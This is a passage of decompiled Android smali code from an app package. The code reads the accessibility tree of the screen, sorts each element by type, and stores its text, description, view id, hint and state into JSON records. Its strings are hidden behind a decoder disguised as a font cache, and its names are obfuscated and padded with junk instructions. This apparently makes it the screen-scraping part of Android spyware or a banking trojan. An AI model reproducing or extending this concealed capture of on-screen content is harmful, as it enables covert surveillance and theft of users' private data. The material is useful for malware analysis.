    .line 128
    const-string v8, "0037007300430093"

    .line 129
    .line 130
    if-nez v6, :cond_1e

    .line 131
    .line 132
    :try_start_2
    const-string v6, "000F00790058008C00C000BE00C600B3002600640055"

    .line 133
    .line 134
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 135
    .line 136
    .line 137
    move-result-object v6

    .line 138
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 139
    .line 140
    .line 141
    move-result v6

    .line 142
    if-eqz v6, :cond_5

    .line 143
    .line 144
    goto/16 :goto_9

    nop

    nop

    .line 145
    .line 146
    :cond_5
    const-string v6, "00170079005C008000FC00BA00F000B20037006200540089"

    .line 147
    .line 148
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 149
    .line 150
    .line 151
    move-result-object v6

    .line 152
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 153
    .line 154
    .line 155
    move-result v6

    .line 156
    if-nez v6, :cond_1d

    nop

    nop

    .line 157
    .line 158
    const-string v6, "001000610052009300F300B7"

    nop

    .line 159
    .line 160
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 161
    .line 162
    .line 163
    move-result-object v6

    .line 164
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 165
    .line 166
    .line 167
    move-result v6

    nop

    nop

    .line 168
    if-nez v6, :cond_1d

    .line 169
    .line 170
    const-string v6, "000000790056009700FF00AA00DC00A300010063004F009300FF00B1"

    .line 171
    .line 172
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 173
    .line 174
    .line 175
    move-result-object v6

    .line 176
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 177
    .line 178
    .line 179
    move-result v6

    .line 180
    if-eqz v6, :cond_6

    .line 181
    .line 182
    goto/16 :goto_8

    nop

    .line 183
    .line 184
    :cond_6
    const-string v6, "0000007E005E008400FB009D00DD00BF"

    .line 185
    .line 186
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 187
    .line 188
    .line 189
    move-result-object v6

    .line 190
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 191
    .line 192
    .line 193
    move-result v6

    .line 194
    if-eqz v6, :cond_7

    .line 195
    .line 196
    const-string v6, "0020007E005E008400FB00BD00DD00BF"

    .line 197
    .line 198
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 199
    .line 200
    .line 201
    move-result-object v6

    .line 202
    goto/16 :goto_a

    .line 203
    .line 204
    :cond_7
    const-string v6, "00110077005F008E00FF009D00C700B3003700790055"

    .line 205
    .line 206
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 207
    .line 208
    .line 209
    move-result-object v6

    nop

    nop

    .line 210
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 211
    .line 212
    .line 213
    move-result v6

    .line 214
    if-eqz v6, :cond_8

    .line 215
    .line 216
    const-string v6, "00310077005F008E00FF"

    .line 217
    .line 218
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 219
    .line 220
    .line 221
    move-result-object v6

    .line 222
    goto/16 :goto_a

    .line 223
    .line 224
    :cond_8
    const-string v6, "00100073005E008C00D200BE00C0"

    nop

    nop

    .line 225
    .line 226
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 227
    .line 228
    .line 229
    move-result-object v6

    .line 230
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 231
    .line 232
    .line 233
    move-result v6

    .line 234
    if-nez v6, :cond_1c

    .line 235
    .line 236
    const-string v6, "001300640054008000E200BA00C100B4000100770049"

    nop

    nop

    .line 237
    .line 238
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 239
    .line 240
    .line 241
    move-result-object v6

    .line 242
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 243
    .line 244
    .line 245
    move-result v6

    .line 246
    if-nez v6, :cond_1c

    .line 247
    .line 248
    const-string v6, "00110077004F008E00FE00B800F000A60031"

    .line 249
    .line 250
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 251
    .line 252
    .line 253
    move-result-object v6

    .line 254
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 255
    .line 256
    .line 257
    move-result v6

    .line 258
    if-eqz v6, :cond_9

    .line 259
    .line 260
    goto/16 :goto_7

    .line 261
    .line 262
    :cond_9
    const-string v6, "001000660052008900FE00BA00C0"

    .line 263
    .line 264
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 265
    .line 266
    .line 267
    move-result-object v6

    .line 268
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 269
    .line 270
    .line 271
    move-result v6

    .line 272
    if-eqz v6, :cond_a

    nop

    .line 273
    .line 274
    const-string v6, "003000660052008900FE00BA00C0"

    .line 275
    .line 276
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 277
    .line 278
    .line 279
    move-result-object v6

    .line 280
    goto/16 :goto_a

    .line 281
    .line 282
    :cond_a
    const-string v6, "00010063004F009300FF00B1"

    .line 283
    .line 284
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 285
    .line 286
    .line 287
    move-result-object v6

    .line 288
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 289
    .line 290
    .line 291
    move-result v6

    .line 292
    if-nez v6, :cond_1b

    .line 293
    .line 294
    const-string v6, "000E0077004F008200E200B600D300AB00010063004F009300FF00B1"

    .line 295
    .line 296
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 297
    .line 298
    .line 299
    move-result-object v6

    .line 300
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 301
    .line 302
    .line 303
    move-result v6

    nop

    .line 304
    if-eqz v6, :cond_b

    .line 305
    .line 306
    goto/16 :goto_6

    .line 307
    .line 308
    :cond_b
    const-string v6, "000600720052009300C400BA00CA00B3"

    .line 309
    .line 310
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 311
    .line 312
    .line 313
    move-result-object v6

    .line 314
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 315
    .line 316
    .line 317
    move-result v6

    .line 318
    if-nez v6, :cond_1a

    nop

    .line 319
    .line 320
    const-string v6, "00020063004F008800D300B000DF00B7002F0073004F0082"

    .line 321
    .line 322
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 323
    .line 324
    .line 325
    move-result-object v6

    .line 326
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 327
    .line 328
    .line 329
    move-result v6

    .line 330
    if-eqz v6, :cond_c

    .line 331
    .line 332
    goto/16 :goto_5

    .line 333
    .line 334
    :cond_c
    const-string v6, "001700730043009300C600B600D700B0"

    .line 335
    .line 336
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 337
    .line 338
    .line 339
    move-result-object v6

    .line 340
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 341
    .line 342
    .line 343
    move-result v6

    .line 344
    if-eqz v6, :cond_d

    .line 345
    .line 346
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 347
    .line 348
    .line 349
    move-result-object v6

    .line 350
    goto/16 :goto_a

    .line 351
    .line 352
    :cond_d
    const-string v6, "000A007B005A008000F5008900DB00A20034"

    .line 353
    .line 354
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 355
    .line 356
    .line 357
    move-result-object v6

    .line 358
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 359
    .line 360
    .line 361
    move-result v6

    .line 362
    if-eqz v6, :cond_e

    .line 363
    .line 364
    const-string v6, "002A007B005A008000F5"

    .line 365
    .line 366
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 367
    .line 368
    .line 369
    move-result-object v6

    .line 370
    goto/16 :goto_a

    .line 371
    .line 372
    :cond_e
    const-string v6, "000A007B005A008000F5009D00C700B3003700790055"

    .line 373
    .line 374
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 375
    .line 376
    .line 377
    move-result-object v6

    .line 378
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 379
    .line 380
    .line 381
    move-result v6

    .line 382
    if-eqz v6, :cond_f

    .line 383
    .line 384
    const-string v6, "002A007B005A008000F5008000D000B20037006200540089"

    .line 385
    .line 386
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 387
    .line 388
    .line 389
    move-result-object v6

    .line 390
    goto/16 :goto_a

    .line 391
    .line 392
    :cond_f
    const-string v6, "00140073005900B100F900BA00C5"

    .line 393
    .line 394
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 395
    .line 396
    .line 397
    move-result-object v6

    .line 398
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 399
    .line 400
    .line 401
    move-result v6

    .line 402
    if-eqz v6, :cond_10

    .line 403
    .line 404
    const-string v6, "003400730059009100F900BA00C5"

    nop

    nop

    .line 405
    .line 406
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 407
    .line 408
    .line 409
    move-result-object v6

    nop

    .line 410
    goto/16 :goto_a

    .line 411
    .line 412
    :cond_10
    const-string v6, "00170077005900B000F900BB00D500A20037"

    .line 413
    .line 414
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 415
    .line 416
    .line 417
    move-result-object v6

    .line 418
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 419
    .line 420
    .line 421
    move-result v6

    .line 422
    if-nez v6, :cond_19

    .line 423
    .line 424
    const-string v6, "00170077005900AB00F100A600DD00B20037"

    nop

    nop

    .line 425
    .line 426
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 427
    .line 428
    .line 429
    move-result-object v6

    .line 430
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 431
    .line 432
    .line 433
    move-result v6

    .line 434
    if-eqz v6, :cond_11

    nop

    nop

    .line 435
    .line 436
    goto/16 :goto_4

    nop

    nop

    .line 437
    .line 438
    :cond_11
    const-string v6, "001100730058009E00F300B300D700B50015007F005E0090"

    .line 439
    .line 440
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 441
    .line 442
    .line 443
    move-result-object v6

    .line 444
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 445
    .line 446
    .line 447
    move-result v6

    .line 448
    if-nez v6, :cond_18

    .line 449
    .line 450
    const-string v6, "000F007F0048009300C600B600D700B0"

    .line 451
    .line 452
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 453
    .line 454
    .line 455
    move-result-object v6

    .line 456
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 457
    .line 458
    .line 459
    move-result v6

    .line 460
    if-eqz v6, :cond_12

    nop

    nop

    .line 461
    .line 462
    goto/16 :goto_3

    .line 463
    :cond_12
    const-string v6, "001000750049008800FC00B300E400AE00260061"

    .line 464
    .line 465
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 466
    .line 467
    .line 468
    move-result-object v6

    .line 469
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 470
    .line 471
    .line 472
    move-result v6

    .line 473
    if-nez v6, :cond_17

    .line 474
    .line 475
    const-string v6, "000D00730048009300F500BB00E100A4003100790057008B"

    .line 476
    .line 477
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 478
    .line 479
    .line 480
    move-result-object v6

    .line 481
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 482
    .line 483
    .line 484
    move-result v6

    .line 485
    if-eqz v6, :cond_13

    .line 486
    .line 487
    goto/16 :goto_2

    .line 488
    :cond_13
    const-string v6, "001700790054008B00F200BE00C0"

    .line 489
    .line 490
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 491
    .line 492
    .line 493
    move-result-object v6

    .line 494
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 495
    .line 496
    .line 497
    move-result v6

    .line 498
    if-nez v6, :cond_16

    nop

    nop

    .line 499
    .line 500
    const-string v6, "00020075004F008E00FF00B100F000A60031"

    .line 501
    .line 502
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 503
    .line 504
    .line 505
    move-result-object v6

    .line 506
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 507
    .line 508
    .line 509
    move-result v6

    .line 510
    if-eqz v6, :cond_14

    .line 511
    .line 512
    goto :goto_1

    .line 513
    :cond_14
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 514
    .line 515
    .line 516
    move-result v6

    .line 517
    if-eqz v6, :cond_15

    .line 518
    .line 519
    const-string v6, "0020007A0052008400FB00BE00D000AB0026"

    .line 520
    .line 521
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 522
    .line 523
    .line 524
    move-result-object v6

    .line 525
    goto :goto_a

    .line 526
    :cond_15
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 527
    .line 528
    .line 529
    move-result-object v6

    .line 530
    goto/16 :goto_a

    .line 531
    :cond_16
    :goto_1
    const-string v6, "003700790054008B00F200BE00C0"

    nop

    .line 532
    .line 533
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 534
    .line 535
    .line 536
    move-result-object v6

    .line 537
    goto :goto_a

    .line 538
    :cond_17
    :goto_2
    const-string v6, "003000750049008800FC00B3"

    .line 539
    .line 540
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 541
    .line 542
    .line 543
    move-result-object v6

    nop

    .line 544
    goto :goto_a

    .line 545
    :cond_18
    :goto_3
    const-string v6, "002F007F00480093"

    .line 546
    .line 547
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 548
    .line 549
    .line 550
    move-result-object v6

    .line 551
    goto :goto_a

    .line 552
    :cond_19
    :goto_4
    const-string v6, "003700770059"

    .line 553
    .line 554
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 555
    .line 556
    .line 557
    move-result-object v6

    .line 558
    goto :goto_a

    .line 559
    :cond_1a
    :goto_5
    const-string v6, "002A0078004B009200E4"

    .line 560
    .line 561
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 562
    .line 563
    .line 564
    move-result-object v6

    .line 565
    goto :goto_a

    .line 566
    :cond_1b
    :goto_6
    const-string v6, "00210063004F009300FF00B1"

    .line 567
    .line 568
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 569
    .line 570
    .line 571
    move-result-object v6

    .line 572
    goto/16 :goto_a

    .line 573
    :cond_1c
    :goto_7
    const-string v6, "003300640054008000E200BA00C100B4"

    .line 574
    .line 575
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 576
    .line 577
    .line 578
    move-result-object v6

    .line 579
    goto/16 :goto_a

    .line 580
    :cond_1d
    :goto_8
    const-string v6, "003000610052009300F300B7"

    .line 581
    .line 582
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 583
    .line 584
    .line 585
    move-result-object v6

    .line 586
    goto :goto_a

    .line 587
    :cond_1e
    :goto_9
    const-string v6, "00330077004F009300F500AD00DC"

    .line 588
    .line 589
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 590
    .line 591
    .line 592
    move-result-object v6

    .line 593
    :goto_a
    const-string v9, "0037006F004B0082"

    .line 594
    .line 595
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 596
    .line 597
    .line 598
    move-result-object v9

    .line 599
    invoke-virtual {v2, v9, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 600
    .line 601
    .line 602
    const-string v9, "0020007A0048"

    .line 603
    .line 604
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 605
    .line 606
    .line 607
    move-result-object v9

    .line 608
    invoke-static {v1, v1}, Lv/s/KgSM0TsKUpCiuePB;->PPWVWMPAUcr9AGNUSxQ(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 609
    .line 610
    .line 611
    move-result-object v1

    nop

    nop

    .line 612
    invoke-virtual {v2, v9, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 613
    .line 614
    .line 615
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 616
    .line 617
    .line 618
    move-result-object v1

    .line 619
    const/16 v9, 0xc8

    nop

    .line 620
    .line 621
    if-eqz v1, :cond_1f

    .line 622
    .line 623
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 624
    .line 625
    .line 626
    move-result-object v1

    .line 627
    if-eqz v1, :cond_1f

    .line 628
    .line 629
    invoke-static {v1, v9}, Lv/s/KgSM0TsKUpCiuePB;->KV57Z6oavcB595B8Dy8Z(Ljava/lang/String;I)Ljava/lang/String;

    .line 630
    .line 631
    .line 632
    move-result-object v1

    nop

    .line 633
    goto/16 :goto_b

    .line 634
    :cond_1f
    move-object v1, v3

    .line 635
    :goto_b
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 636
    .line 637
    .line 638
    move-result-object v10

    .line 639
    if-eqz v10, :cond_20

    .line 640
    .line 641
    invoke-virtual {v10}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 642
    .line 643
    .line 644
    move-result-object v10

    .line 645
    if-eqz v10, :cond_20

    .line 646
    .line 647
    invoke-static {v10, v9}, Lv/s/KgSM0TsKUpCiuePB;->KV57Z6oavcB595B8Dy8Z(Ljava/lang/String;I)Ljava/lang/String;

    .line 648
    .line 649
    .line 650
    move-result-object v3

    .line 651
    :cond_20
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 652
    .line 653
    .line 654
    move-result-object v8

    .line 655
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 656
    .line 657
    .line 658
    move-result v9

    .line 659
    if-nez v9, :cond_21

    .line 660
    .line 661
    move-object/from16 v9, v3

    .line 662
    goto :goto_c

    nop

    nop

    .line 663
    :cond_21
    move-object/from16 v9, v1

    .line 664
    :goto_c
    invoke-virtual {v2, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 665
    .line 666
    .line 667
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 668
    .line 669
    .line 670
    move-result v8

    .line 671
    if-lez v8, :cond_22

    nop

    .line 672
    .line 673
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 674
    .line 675
    .line 676
    move-result v8

    .line 677
    if-lez v8, :cond_22

    .line 678
    .line 679
    invoke-virtual {v1, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 680
    .line 681
    .line 682
    move-result v8

    .line 683
    if-nez v8, :cond_22

    .line 684
    .line 685
    const-string v8, "0027007300480084"

    .line 686
    .line 687
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 688
    .line 689
    .line 690
    move-result-object v8

    .line 691
    invoke-virtual {v2, v8, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 692
    .line 693
    .line 694
    :cond_22
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 695
    .line 696
    .line 697
    move-result-object v8

    .line 698
    if-eqz v8, :cond_24

    .line 699
    .line 700
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 701
    .line 702
    .line 703
    move-result-object v9

    .line 704
    invoke-static {v8, v9, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 705
    .line 706
    .line 707
    move-result v9

    .line 708
    if-eqz v9, :cond_23

    .line 709
    .line 710
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 711
    .line 712
    .line 713
    move-result-object v0

    .line 714
    invoke-static {v8, v0}, Lv/s/KgSM0TsKUpCiuePB;->SggvLZZelD4B3v(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 715
    .line 716
    .line 717
    move-result-object v8

    .line 718
    :cond_23
    const-string v0, "id"

    .line 719
    .line 720
    invoke-virtual {v2, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 721
    .line 722
    .line 723
    :cond_24
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 724
    .line 725
    .line 726
    move-result-object v0

    .line 727
    if-eqz v0, :cond_25

    .line 728
    .line 729
    const-string v0, "002B007F00550093"

    .line 730
    .line 731
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 732
    .line 733
    .line 734
    move-result-object v0

    .line 735
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 736
    .line 737
    .line 738
    move-result-object v8

    .line 739
    invoke-virtual {v8}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 740
    .line 741
    .line 742
    move-result-object v8

    nop

    .line 743
    const/16 v9, 0x64

    .line 744
    .line 745
    invoke-static {v8, v9}, Lv/s/KgSM0TsKUpCiuePB;->KV57Z6oavcB595B8Dy8Z(Ljava/lang/String;I)Ljava/lang/String;

    .line 746
    .line 747
    .line 748
    move-result-object v8

    .line 749
    invoke-virtual {v2, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 750
    .line 751
    .line 752
    :cond_25
    const-string v0, "0020007A0052008400FB"

    .line 753
    .line 754
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 755
    .line 756
    .line 757
    move-result-object v0

    nop

    nop

    .line 758
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 759
    .line 760
    .line 761
    move-result v8

    .line 762
    invoke-virtual {v2, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 763
    .line 764
    .line 765
    const-string v0, "0026007200520093"

    .line 766
    .line 767
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 768
    .line 769
    .line 770
    move-result-object v0

    .line 771
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 772
    .line 773
    .line 774
    move-result v8

    .line 775
    invoke-virtual {v2, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 776
    .line 777
    .line 778
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    .line 779
    .line 780
    .line 781
    move-result v0

    .line 782
    if-eqz v0, :cond_26

    .line 783
    .line 784
    const-string v0, "0020007E0050"

    .line 785
    .line 786
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 787
    .line 788
    .line 789
    move-result-object v0

    .line 790
